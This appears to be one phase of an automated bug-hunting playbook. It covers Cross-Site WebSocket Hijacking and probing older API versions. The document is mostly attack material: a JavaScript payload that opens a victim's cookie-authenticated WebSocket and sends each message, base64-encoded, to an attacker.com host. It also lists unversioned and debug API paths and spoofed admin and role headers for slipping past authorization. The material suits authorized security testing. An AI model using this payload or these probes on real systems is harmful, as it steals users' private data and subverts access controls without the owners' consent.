# ZDH Phase 22: WebSocket Hijacking & API Version Attacks

## Phase 22 - WebSocket Hijacking & API Version Attacks

```javascript
// Cross-Site WebSocket Hijacking (CSWSH)
// If WebSocket handshake uses cookies (not explicit token), any page can hijack it
// Test: does WS handshake include Cookie header?
// If yes: create attacker page that opens WS to target:
var ws = new WebSocket("wss://target.com/ws");
ws.onmessage = function(e) { fetch("https://attacker.com/?d=" + btoa(e.data)); }
// If server sends chat history/user data on connect = Critical account takeover

// API versioning discovery - older versions often lack auth or validation
// Current API: /api/v3/user/profile  -> Try:
GET /api/v0/user/profile
GET /api/v1/user/profile
GET /api/v2/user/profile
GET /api/beta/user/profile
GET /api/internal/user/profile
GET /api/debug/user/profile
GET /v1/user/profile          // no /api/ prefix
GET /user/profile             // no version at all

// Also try adding internal flags that may unlock extra data:
-H "X-Debug: true"
-H "X-Internal: 1"
-H "X-Admin: true"
-H "X-Role: admin"
```

**Signal:** `emit_signal VULN_CONFIRMED "CSWSH: WebSocket <endpoint> hijackable via cookies" "main/zerodayhunt" 0.87`
